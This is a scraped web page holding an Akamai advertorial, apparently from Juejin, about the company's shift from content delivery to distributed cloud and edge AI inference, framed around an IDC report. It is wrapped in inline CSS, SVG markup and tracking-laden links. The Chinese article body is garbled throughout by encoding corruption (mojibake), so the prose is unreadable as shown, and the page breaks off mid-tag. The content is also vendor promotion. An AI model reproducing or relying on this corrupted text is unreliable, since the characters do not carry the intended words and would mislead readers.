  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T13:13:34.000Z" title="Wed Jan 14 2026 13:13:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>éšç€AI æ¨ç†ä»é›†ä¸­å¼æœåŠ¡å™¨èµ°å‘è¾¹ç¼˜ï¼Œå®ƒæ­£ä»æ ¹æœ¬ä¸Šé‡æ–°åˆ†é…è®¡ç®—èµ„æºã€‚Akamai çš„æ¶æ„æ­£æ˜¯ä¸ºæ­¤è€Œå»ºï¼šé¦–å…ˆï¼Œæˆ‘ä»¬å¼€åˆ›äº†å†…å®¹çš„äº¤ä»˜ï¼›å¦‚ä»Šï¼Œæˆ‘ä»¬æ­£å¼•é¢†æ™ºèƒ½çš„äº¤ä»˜ã€‚</p>
<p>å‡­å€ŸäºŒåå¤šå¹´çš„ç»éªŒï¼Œæˆ‘ä»¬æ­£åŸºäºåŒä¸€æ ¸å¿ƒç†å¿µä¸ºAI æ„å»ºæœªæ¥ï¼šå°†æ¨ç†å¸¦åˆ°æ›´æ¥è¿‘å†³ç­–äº§ç”Ÿçš„åœ°æ–¹ã€‚è¿™æ˜¯äº‘æ¶æ„æ¼”è¿›çš„ä¸‹ä¸€ä¸ªé˜¶æ®µâ€”â€”å…¶èŒƒå›´æ­£ä»é›†ä¸­å¼åŒºåŸŸæ‰©å±•åˆ°åˆ†å¸ƒå¼è¾¹ç¼˜ï¼Œä»è€Œé‡æ–°å®šä¹‰äº‘çš„æ¶æ„ã€‚</p>
<p>IDC è¿‘æœŸå‘å¸ƒçš„æŠ¥å‘Šã€Š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.akamai.com%2Fzh%2Fresources%2Fresearch-paper%2Fidc-report-cloud-evolution%3Futm_campaign%3Df-mc-65893%26utm_id%3Dapj_cc%26utm_source%3Djuejin%26utm_medium%3Darticle_advertorial%26utm_content%3Djuejing_260114_external1_blogarticles242" target="_blank" title="https://www.akamai.com/zh/resources/research-paper/idc-report-cloud-evolution?utm_campaign=f-mc-65893&amp;utm_id=apj_cc&amp;utm_source=juejin&amp;utm_medium=article_advertorial&amp;utm_content=juejing_260114_external1_blogarticles242" ref="nofollow noopener noreferrer">Akamaiï¼šé©°éª‹äº‘ç–†ç•Œâ€”â€”ä»CDN åˆ°åˆ†å¸ƒå¼äº‘æä¾›å•†çš„è½¬å‹</a>ã€‹æ•æ‰äº†è¿™ä¸€è½¬å˜ã€‚å®ƒè¿½æº¯äº†æˆ‘ä»¬å¦‚ä½•ä»ç½‘ç»œæœ€åˆçš„äº¤ä»˜å…ˆé”‹ï¼Œæ¼”è¿›ä¸ºä¸ºAI é©±åŠ¨çš„æœªæ¥åšå¥½å‡†å¤‡çš„åˆ†å¸ƒå¼äº‘æä¾›å•†ã€‚</p>
<p>å¯¹äºæ­£åœ¨ä¸ºæœªæ¥å‘å±•åšå‡†å¤‡çš„é¢†å¯¼è€…è€Œè¨€ï¼Œè¿™ä»½IDC æŠ¥å‘Šå€¼å¾—ç»†è¯»ã€‚å®ƒå±•ç¤ºäº†Akamai å¦‚ä½•ä¸€ç›´åœ¨æ„å»ºå³å°†åˆ°æ¥çš„AI æ—¶ä»£æ‰€éœ€çš„é‚£ç§åˆ†å¸ƒå¼åŸºç¡€ï¼Œä»¥åŠæˆ‘ä»¬è¿‡å»çš„ç»éªŒæ•™è®­å¦‚ä½•å¡‘é€ ç€æœªæ¥çš„æ¶æ„ã€‚</p>
<p><strong><strong>è´¯ç©¿å§‹ç»ˆçš„è‡ªæˆ‘é‡å¡‘</strong></strong></p>
<p>Akamai è¯ç”Ÿäºä¸‡ç»´ç½‘çš„ç¬¬ä¸€ä¸ªç“¶é¢ˆæœŸã€‚</p>
<p>1995 å¹´ï¼Œä¸‡ç»´ç½‘å‘æ˜è€…Tim Berners-Lee å‘éº»çœç†å·¥å­¦é™¢çš„ç ”ç©¶äººå‘˜æå‡ºæŒ‘æˆ˜ï¼Œè¦æ±‚æ‰¾åˆ°ä¸€ç§æ›´å¿«ã€æ›´æ™ºèƒ½çš„åœ¨çº¿å†…å®¹äº¤ä»˜æ–¹å¼ã€‚æˆ‘ä»¬çš„è”åˆåˆ›å§‹äººÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.akamai.com%2Fzh%2Fcompany%2Fleadership%2Fexecutive-team%2Ftom-leighton%3Futm_campaign%3Df-mc-65893%26utm_id%3Dapj_cc%26utm_source%3Djuejin%26utm_medium%3Darticle_advertorial%26utm_content%3Djuejing_260114_external2_blogarticles242" target="_blank" title="https://www.akamai.com/zh/company/leadership/executive-team/tom-leighton?utm_campaign=f-mc-65893&amp;utm_id=apj_cc&amp;utm_source=juejin&amp;utm_medium=article_advertorial&amp;utm_content=juejing_260114_external2_blogarticles242" ref="nofollow noopener noreferrer">Tom Leighton</a>åšå£«å’ŒÂ <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.akamai.com%2Fzh%2Fcompany%2Fleadership%2Fakamai-remembers-danny-lewin%3Futm_campaign%3Df-mc-65893%26utm_id%3Dapj_cc%26utm_source%3Djuejin%26utm_medium%3Darticle_advertorial%26utm_content%3Djuejing_260114_external3_blogarticles242" target="_blank" title="https://www.akamai.com/zh/company/leadership/akamai-remembers-danny-lewin?utm_campaign=f-mc-65893&amp;utm_id=apj_cc&amp;utm_source=juejin&amp;utm_medium=article_advertorial&amp;utm_content=juejing_260114_external3_blogarticles242" ref="nofollow noopener noreferrer">Danny Lewin</a>Â é€šè¿‡<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.akamai.com%2Fzh%2Fglossary%2Fwhat-is-a-cdn%3Futm_campaign%3Df-mc-65893%26utm_id%3Dapj_cc%26utm_source%3Djuejin%26utm_medium%3Darticle_advertorial%26utm_content%3Djuejing_260114_external4_blogarticles242" target="_blank" title="https://www.akamai.com/zh/glossary/what-is-a-cdn?utm_campaign=f-mc-65893&amp;utm_id=apj_cc&amp;utm_source=juejin&amp;utm_medium=article_advertorial&amp;utm_content=juejing_260114_external4_blogarticles242" ref="nofollow noopener noreferrer">åˆ›å»ºå†…å®¹äº¤ä»˜ç½‘ç»œ</a>ä½œå‡ºäº†å›åº”â€”â€”è¿™ç§è®¾è®¡åœ¨å…¨çƒåˆ†å¸ƒçš„æœåŠ¡å™¨ç½‘ç»œä¸Šå¤åˆ¶å’Œè·¯ç”±å†…å®¹ã€‚å®ƒè§£å†³äº†å½“æ—¶ä¿—ç§°çš„â€œå…¨çƒç­‰å¾…â€é—®é¢˜ã€‚</p>
<p>è‡ªæ­¤ï¼ŒåŒæ ·çš„åŸåˆ™â€”â€”è¿‘åˆ™å¿«â€”â€”ä¸€ç›´æŒ‡å¼•ç€æˆ‘ä»¬ã€‚éšç€äº’è”ç½‘çš„æˆç†Ÿï¼Œæˆ‘ä»¬è®¤è¯†åˆ°ï¼ŒåŠ é€Ÿå†…å®¹äº¤ä»˜çš„åˆ†å¸ƒå¼è®¾è®¡åŒæ ·ä¹Ÿèƒ½ä¿æŠ¤å†…å®¹å®‰å…¨ã€‚æ—©åœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.akamai.com%2Fzh%2Fglossary%2Fwhat-is-zero-trust-networking%3Futm_campaign%3Df-mc-65893%26utm_id%3Dapj_cc%26utm_source%3Djuejin%26utm_medium%3Darticle_advertorial%26utm_content%3Djuejing_260114_external5_blogarticles242" target="_blank" title="https://www.akamai.com/zh/glossary/what-is-zero-trust-networking?utm_campaign=f-mc-65893&amp;utm_id=apj_cc&amp;utm_source=juejin&amp;utm_medium=article_advertorial&amp;utm_content=juejing_260114_external5_blogarticles242" ref="nofollow noopener noreferrer">é›¶ä¿¡ä»»</a>æˆä¸ºä¸»æµä¹‹å‰ï¼Œæˆ‘ä»¬å°±å¼€å§‹é€šè¿‡æˆ˜ç•¥æ”¶è´­ï¼ˆå¦‚Â Prolexicã€Soha Systems å’ŒÂ Guardicoreï¼‰ï¼Œå°†ä¸šåŠ¡ä»äº¤ä»˜æ‰©å±•åˆ°å®‰å…¨é¢†åŸŸã€‚</p>
<p>éšåï¼Œåœ¨2022 å¹´ï¼Œæˆ‘ä»¬å¯¹Linode çš„æ”¶è´­å°†å¼€å‘è€…å‹å¥½çš„äº‘è®¡ç®—çº³å…¥ç‰ˆå›¾ã€‚IDC ç§°æ­¤æ¬¡æ”¶è´­æ˜¯é‡æ–°å®šä¹‰Akamai å‘å±•è½¨è¿¹çš„â€œå¥ åŸºæ€§â€æ—¶åˆ»â€”â€”ä¸€æ¬¡æ·±æ€ç†Ÿè™‘çš„å‘äº‘åŸºç¡€è®¾æ–½çš„è½¬å‹ï¼Œä½¿æˆ‘ä»¬èƒ½å¤Ÿè¿è¡Œè®¡ç®—å·¥ä½œè´Ÿè½½ï¼Œè€Œä¸ä»…ä»…æ˜¯äº¤ä»˜å†…å®¹ã€‚</p>
<p>ä»è®¸å¤šæ–¹é¢æ¥çœ‹ï¼Œè¿™æ˜¯æˆ‘ä»¬æ¼”è¿›è¿‡ç¨‹ä¸­é¡ºç†æˆç« çš„ä¸‹ä¸€æ­¥ï¼šæ›¾ç»ä¼ è¾“å†…å®¹æ¯”ç‰¹çš„åˆ†å¸ƒå¼ç½‘ç»œï¼Œå¦‚ä»Šä¹Ÿåœ¨ä¼ è¾“è®¡ç®—å·¥ä½œè´Ÿè½½ã€‚</p>
<p><strong><strong>ä»äº¤ä»˜åˆ°åˆ†å¸ƒå¼äº‘</strong></strong></p>
<p>IDC æ¸…æ™°åœ°æè¿°äº†Akamai ä»Šå¤©çš„ä¸šåŠ¡ï¼šä¸‰ä¸ªç›¸äº’å…³è”çš„æ”¯æŸ±â€”â€”äº¤ä»˜ã€å®‰å…¨å’Œäº‘è®¡ç®—ã€‚ä¸‰è€…ç›¸è¾…ç›¸æˆï¼Œå…±åŒæ„æˆäº†ä¸€ä¸ªé›†æ€§èƒ½ã€é˜²æŠ¤å’Œå¯æ‰©å±•æ€§äºä¸€ä½“çš„ç»Ÿä¸€æ¶æ„ã€‚</p>
<p>è¿™ç§äº’è”æ€§æ­£æ˜¯æˆ‘ä»¬ä¸ä¼ ç»Ÿè¶…å¤§è§„æ¨¡æä¾›å•†çš„ä¸åŒä¹‹å¤„ã€‚å°½ç®¡å¤§å¤šæ•°è¶…å¤§è§„æ¨¡æä¾›å•†å°†è®¡ç®—é›†ä¸­åœ¨å°‘æ•°å‡ ä¸ªå¤§å‹åŒºåŸŸæ•°æ®ä¸­å¿ƒï¼Œä½†æˆ‘ä»¬ä¸€ç›´åœ¨å°†è®¡ç®—å‘å¤–å»¶ä¼¸ï¼Œå°†æ–°çš„æ ¸å¿ƒå’Œåˆ†å¸ƒå¼äº‘ç«™ç‚¹ç›´æ¥é›†æˆåˆ°æˆ‘ä»¬ç°æœ‰çš„ã€éå¸ƒ134 ä¸ªå›½å®¶ã€è¶…è¿‡4,400 ä¸ªä½ç½®çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.akamai.com%2Fzh%2Fglossary%2Fwhat-is-edge-computing%3Futm_campaign%3Df-mc-65893%26utm_id%3Dapj_cc%26utm_source%3Djuejin%26utm_medium%3Darticle_advertorial%26utm_content%3Djuejing_260114_external6_blogarticles242" target="_blank" title="https://www.akamai.com/zh/glossary/what-is-edge-computing?utm_campaign=f-mc-65893&amp;utm_id=apj_cc&amp;utm_source=juejin&amp;utm_medium=article_advertorial&amp;utm_content=juejing_260114_external6_blogarticles242" ref="nofollow noopener noreferrer">è¾¹ç¼˜ç½‘ç»œ</a>ä¸­ã€‚</p>
<p>å…¶ç»“æœæ˜¯ä¸€ä¸ªä»æ ¸å¿ƒåˆ°è¾¹ç¼˜æ— ç¼è¡”æ¥çš„è®¡ç®—è¿ç»­ä½“ï¼Œä¸“ä¸ºä½å»¶è¿Ÿã€é«˜å¯ç”¨æ€§å’ŒåŸç”Ÿï¼ˆè€Œéå åŠ çš„ï¼‰å®‰å…¨æ€§è€Œè®¾è®¡ã€‚IDC è®¤ä¸ºï¼Œè¿™ç§æ¶æ„æ˜¯Akamai åœ¨è¾¹ç¼˜è®¡ç®—å’ŒAI æ¨ç†æ—¶ä»£çš„å†³å®šæ€§ä¼˜åŠ¿æ‰€åœ¨ï¼Œåœ¨è¿™ä¸ªæ—¶ä»£ï¼Œæ¯«ç§’ä¹‹å·®ä¸è·ç¦»è¿œè¿‘è‡³å…³é‡è¦ã€‚</p>
<p><strong><strong>åˆ†å¸ƒå¼ä¸º AI å¸¦æ¥çš„ä¼˜åŠ¿</strong></strong></p>
<p>æ¯ä¸€æ¬¡é‡å¤§çš„æŠ€æœ¯æµªæ½®éƒ½ä¼šé‡å¡‘åŸºç¡€è®¾æ–½ï¼š</p>
<ul>
<li>ç½‘ç»œå°†æ•°æ®æ¨å‘è¾¹ç¼˜ä»¥å®ç°æ›´å¿«è®¿é—®ã€‚</li>
<li>ç§»åŠ¨å°†è®¡ç®—æ¨å‘æ›´é è¿‘è®¾å¤‡çš„ä½ç½®ã€‚</li>
<li>äº‘ä¸ºè¿½æ±‚è§„æ¨¡è€Œé‡æ–°é›†ä¸­å·¥ä½œè´Ÿè½½ã€‚</li>
<li>è€Œå¦‚ä»Šï¼ŒAI ä¸ºäº†é€Ÿåº¦ã€éšç§å’Œæˆæœ¬ï¼Œæ­£åœ¨å†æ¬¡å°†è¿™äº›å·¥ä½œè´Ÿè½½å»ä¸­å¿ƒåŒ–ã€‚</li>
</ul>
<p>ä»è®­ç»ƒåˆ°æ¨ç†çš„è½¬å˜ä¹Ÿä¸ä¾‹å¤–ã€‚æ¨ç†å·¥ä½œè´Ÿè½½è¦æ±‚è®¡ç®—æ›´æ¥è¿‘ç”¨æˆ·å’Œæ•°æ®æºï¼Œè€Œéå±€é™äºé›†ä¸­å¼åŒºåŸŸã€‚æ­£å¦‚IDC æ‰€æŒ‡å‡ºçš„ï¼Œè¿™ç§é‚»è¿‘æ€§â€œé™ä½äº†å»¶è¿Ÿï¼Œå¢å¼ºäº†AI åº”ç”¨çš„å®æ—¶å“åº”èƒ½åŠ›â€ã€‚</p>
<p>è¿™æ­£æ˜¯æˆ‘ä»¬çš„Â <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.akamai.com%2Fzh%2Fproducts%2Fakamai-inference-cloud-platform%3Futm_campaign%3Df-mc-65893%26utm_id%3Dapj_cc%26utm_source%3Djuejin%26utm_medium%3Darticle_advertorial%26utm_content%3Djuejing_260114_external7_blogarticles242" target="_blank" title="https://www.akamai.com/zh/products/akamai-inference-cloud-platform?utm_campaign=f-mc-65893&amp;utm_id=apj_cc&amp;utm_source=juejin&amp;utm_medium=article_advertorial&amp;utm_content=juejing_260114_external7_blogarticles242" ref="nofollow noopener noreferrer">Akamai æ¨ç†äº‘</a>çš„æ„å»ºç›®æ ‡ã€‚é€šè¿‡åœ¨è¾¹ç¼˜è¿è¡Œæ¨ç†ï¼Œæˆ‘ä»¬å¯ä»¥é™ä½è¿œè·ç¦»ä¼ è¾“æ•°æ®è¿›è¡Œå¤„ç†çš„æˆæœ¬å’Œå»¶è¿Ÿã€‚è¿™æ˜¯æˆ‘ä»¬25 å¹´æ¥è®©è®¡ç®—æ›´æ¥è¿‘ç”¨æˆ·è¿™ä¸€ä½¿å‘½çš„å»¶ç»­ã€‚</p>
<p>è¿™ä¹Ÿæ˜¯å¯¹AI ç»æµæ€§çš„åŠ¡å®å›åº”ã€‚</p>
<p>è¶…å¤§è§„æ¨¡è®­ç»ƒå°†å§‹ç»ˆå æœ‰ä¸€å¸­ä¹‹åœ°ï¼Œä½†éšç€æ¨¡å‹æŠ•å…¥ç”Ÿäº§â€”â€”èµ‹èƒ½èŠå¤©æœºå™¨äººã€æ¨èå¼•æ“ã€è§†é¢‘æ™ºèƒ½å’Œå®æ—¶åˆ†æâ€”â€”æ¨ç†æ•ˆç‡å°†æˆä¸ºçœŸæ­£çš„å·®å¼‚åŒ–å› ç´ ã€‚æˆ‘ä»¬çš„å…¨çƒåˆ†å¸ƒå¼ç½‘ç»œèµ‹äºˆäº†æˆ‘ä»¬å¤©ç„¶çš„ä¼˜åŠ¿ï¼šä¸é›†ä¸­å¼æ¶æ„ç›¸æ¯”ï¼Œæˆ‘ä»¬å¯ä»¥æ›´å¿«ã€æ›´ç»æµã€æ›´å®‰å…¨åœ°äº¤ä»˜è¿™äº›å·¥ä½œè´Ÿè½½ã€‚</p>
<p>å¯¹äºä»»ä½•å¸Œæœ›å¤§è§„æ¨¡éƒ¨ç½²AI åº”ç”¨çš„ä¼ä¸šé¢†å¯¼è€…è€Œè¨€ï¼Œè¿™ç§æ¶æ„å·®å¼‚è‡³å…³é‡è¦ã€‚</p>
<p><strong><strong>ä»¥å·®å¼‚åŒ–ç«äº‰</strong></strong></p>
<p>IDC çš„æŠ¥å‘Šå¼ºè°ƒï¼ŒAkamai æ­£æœ‰æ„é¿å…ä¸è¶…å¤§è§„æ¨¡æä¾›å•†æ­£é¢äº¤é”‹ã€‚æˆ‘ä»¬å¹¶éå¤åˆ¶ä»–ä»¬çš„å…¨çƒåŒºåŸŸå¸ƒå±€å’Œåºæ‚çš„åŠŸèƒ½ç›®å½•ï¼Œè€Œæ˜¯ä¸“æ³¨äºæˆ‘ä»¬çš„ä¼ ç»Ÿä¼˜åŠ¿é¢†åŸŸï¼šåˆ†å¸ƒå¼æ€§èƒ½ã€å¯é¢„æµ‹çš„å®šä»·å’Œé›†æˆçš„å®‰å…¨ã€‚</p>
<ul>
<li><strong><strong>åˆ†å¸ƒå¼æ€§èƒ½ï¼š</strong></strong>Â æˆ‘ä»¬çš„å…¨çƒå¸ƒå±€ä½¿å·¥ä½œè´Ÿè½½èƒ½å¤Ÿåœ¨æ›´é è¿‘ç”¨æˆ·çš„åœ°æ–¹è¿è¡Œï¼Œä¸ºåª’ä½“ã€æ¸¸æˆå’ŒAI æ¨ç†å®ç°ä¸ªä½æ•°æ¯«ç§’çº§çš„å»¶è¿Ÿã€‚</li>
<li><strong><strong>å¯é¢„æµ‹çš„å®šä»·ï¼š</strong></strong>Â æˆ‘ä»¬åœ¨å†…å®¹äº¤ä»˜æ–¹é¢çš„ç»éªŒå¸¦æ¥äº†æå…·ç«äº‰åŠ›çš„å‡ºç«™æµé‡å®šä»·ï¼Œå¸®åŠ©å®¢æˆ·é¿å…è¶…å¤§è§„æ¨¡äº‘é€šå¸¸å¸¦æ¥çš„ä¸æ–­æ”€å‡çš„æ•°æ®ä¼ è¾“æˆæœ¬ã€‚</li>
<li><strong><strong>é›†æˆåŒ–å®‰å…¨ï¼š</strong></strong>Â ä»<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.akamai.com%2Fzh%2Fglossary%2Fwhat-is-ddos%3Futm_campaign%3Df-mc-65893%26utm_id%3Dapj_cc%26utm_source%3Djuejin%26utm_medium%3Darticle_advertorial%26utm_content%3Djuejing_260114_external8_blogarticles242" target="_blank" title="https://www.akamai.com/zh/glossary/what-is-ddos?utm_campaign=f-mc-65893&amp;utm_id=apj_cc&amp;utm_source=juejin&amp;utm_medium=article_advertorial&amp;utm_content=juejing_260114_external8_blogarticles242" ref="nofollow noopener noreferrer">åˆ†å¸ƒå¼æ‹’ç»æœåŠ¡</a>æ”»å‡»ç¼“è§£åˆ°<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.akamai.com%2Fzh%2Fglossary%2Fwhat-is-ztna%3Futm_campaign%3Df-mc-65893%26utm_id%3Dapj_cc%26utm_source%3Djuejin%26utm_medium%3Darticle_advertorial%26utm_content%3Djuejing_260114_external9_blogarticles242" target="_blank" title="https://www.akamai.com/zh/glossary/what-is-ztna?utm_campaign=f-mc-65893&amp;utm_id=apj_cc&amp;utm_source=juejin&amp;utm_medium=article_advertorial&amp;utm_content=juejing_260114_external9_blogarticles242" ref="nofollow noopener noreferrer">é›¶ä¿¡ä»»ç½‘ç»œè®¿é—®</a>ï¼Œå†…ç½®çš„ä¿æŠ¤åŠŸèƒ½ä¸è®¡ç®—æœ¬èº«å¦‚å½±éšå½¢ã€‚</li>
</ul>
<p>IDC å°†è¿™ç§æ¨¡å¼æè¿°ä¸ºâ€œä¸€ç§ä¸“æ³¨äºä½å»¶è¿Ÿã€é«˜æ€§ä»·æ¯”å’Œå®‰å…¨è§£å†³æ–¹æ¡ˆçš„å·®å¼‚åŒ–äº‘ä½“éªŒâ€ã€‚æ¢å¥è¯è¯´ï¼Œæˆ‘ä»¬å¹¶éè¯•å›¾æˆä¸ºæœ€å¤§çš„äº‘ï¼Œæˆ‘ä»¬æ­£åœ¨æ‰“é€ çš„æ˜¯èƒ½å°†AI å¸¦åˆ°ä»–äººæ— æ³•è§¦åŠä¹‹å¤„çš„äº‘ã€‚</p>
<p><strong><strong>å±•æœ›æœªæ¥</strong></strong></p>
<p>å¦‚æœè¯´æœ‰ä¸€æ¡ä¸»çº¿è´¯ç©¿Akamai çš„å†å²ï¼Œé‚£å°±æ˜¯é€‚åº”ã€‚æ¯ä¸€æ³¢æŠ€æœ¯æµªæ½®éƒ½å°†æˆ‘ä»¬å…ˆå‰å¥ å®šçš„åŸºç¡€è½¬å˜ä¸ºä¸‹ä¸€æ¬¡è·ƒå‡çš„è·³æ¿ã€‚</p>
<p>æˆ‘ä»¬è§£å†³äº†ç½‘ç»œæ‹¥å¡é—®é¢˜ï¼Œéšååˆåˆ©ç”¨åŒæ ·çš„åˆ†å¸ƒå¼æ¶æ„æ¥ä¿éšœå…¶å®‰å…¨ã€‚éšç€äº‘è®¡ç®—çš„åŠ å…¥ï¼Œæˆ‘ä»¬å¼€å§‹è®©å·¥ä½œè´Ÿè½½åœ¨æ›´é è¿‘ç”¨æˆ·çš„åœ°æ–¹è¿è¡Œâ€”â€”ä¸ºä»Šå¤©èµ‹èƒ½å’Œä¿æŠ¤AI çš„å·¥ä½œå¥ å®šäº†åŸºç¡€ã€‚</p>
<p>IDC è®¤ä¸ºï¼Œè¿™æ˜¯Â Akamai â€œç‹¬ç‰¹åœ°å®šä½äºåˆ©ç”¨è¾¹ç¼˜è®¡ç®—å’ŒAI æ¨ç†çˆ†ç‚¸å¼å¢é•¿â€çš„ä¸€ä¸ªå…³é”®åŸå› ã€‚è¿™è¯å®äº†ï¼Œåšå®ˆæˆ‘ä»¬åˆ†å¸ƒå¼çš„åŸºå› å°†æŒç»­å¸¦æ¥å›æŠ¥ã€‚</p>
<p>AI æ—¶ä»£ä¸ä¼šä»…ä»…å¥–èµè§„æ¨¡ã€‚å®ƒå°†é’çèƒ½å¤Ÿ<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.akamai.com%2Fzh%2Fblog%2Fcloud%2Fai-edge-all-you-need%3Futm_campaign%3Df-mc-65893%26utm_id%3Dapj_cc%26utm_source%3Djuejin%26utm_medium%3Darticle_advertorial%26utm_content%3Djuejing_260114_external10_blogarticles242" target="_blank" title="https://www.akamai.com/zh/blog/cloud/ai-edge-all-you-need?utm_campaign=f-mc-65893&amp;utm_id=apj_cc&amp;utm_source=juejin&amp;utm_medium=article_advertorial&amp;utm_content=juejing_260114_external10_blogarticles242" ref="nofollow noopener noreferrer">å°†æ™ºèƒ½ç§»åŠ¨åˆ°ä»»ä½•éœ€è¦ä¹‹å¤„</a>ã€å°½å¯èƒ½è´´è¿‘äº¤äº’æ—¶åˆ»çš„åŸºç¡€è®¾æ–½ã€‚è¿™æ­£æ˜¯æˆ‘ä»¬ä¸€ç›´ä»¥æ¥è‡´åŠ›æ„å»ºçš„æ•æ·æ€§ã€‚</p>
<p><strong><strong>ä¸ºâ€œAI æ— å¤„ä¸åœ¨â€çš„æœªæ¥è€Œæ„å»º</strong></strong></p>
<p>AI ä»£è¡¨äº†ä¸€ç§æ–°çš„è®¡ç®—èŒƒå¼ã€‚ä¸ºäº†å…‘ç°å…¶æ‰¿è¯ºï¼Œä¼ä¸šéœ€è¦ä¸å…¶æ‰€æ”¯æŒçš„æ™ºèƒ½ä¸€æ ·çµæ´»çš„åŸºç¡€è®¾æ–½ã€‚æˆ‘ä»¬åœ¨<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.akamai.com%2Fzh%2Fglossary%2Fwhat-is-a-distributed-cloud%3Futm_campaign%3Df-mc-65893%26utm_id%3Dapj_cc%26utm_source%3Djuejin%26utm_medium%3Darticle_advertorial%26utm_content%3Djuejing_260114_external11_blogarticles242" target="_blank" title="https://www.akamai.com/zh/glossary/what-is-a-distributed-cloud?utm_campaign=f-mc-65893&amp;utm_id=apj_cc&amp;utm_source=juejin&amp;utm_medium=article_advertorial&amp;utm_content=juejing_260114_external11_blogarticles242" ref="nofollow noopener 